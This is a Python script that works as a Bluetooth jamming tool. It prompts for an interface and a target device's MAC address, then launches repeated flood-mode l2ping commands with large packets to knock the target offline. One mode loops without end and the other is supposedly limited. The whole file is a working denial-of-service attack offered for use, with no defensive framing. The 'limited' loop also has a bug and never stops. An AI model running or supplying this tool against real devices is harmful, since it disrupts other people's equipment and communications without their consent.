import subprocess
import colorama
from colorama import Fore, Back, Style
import headers
import time

colorama.init(autoreset=True)
headers.header()

BTService = ("systemctl start bluetooth.service")
subprocess.Popen(BTService, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
timing = 999

def endless_jamming():
    a = True
    interface = input("Your BT interface : ")
    mac = input("MAC of target: ")
    try:
        while a:
            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
            process_1 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            process_2 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            process_3 = subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            time.sleep(0.1)
    except Exception as ctrl:
        print("See ya later")

def limited_jamming():
    global timing
    interface = input("Your BT interface : ")
    mac = input("MAC of target: ")
    try:
        while time != 0:
            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            timing -= 1
    except Exception as error:
        print("See ya later")


def main():
    print(" ")
    user_input = input("Do you want endless jamming? (yes/No): ")
    if user_input.lower() in ["yes", "y", "Y", "Yes", "YES"]:
        endless_jamming()
    else:
        print("We will give them chance...")
        limited_jamming()
main()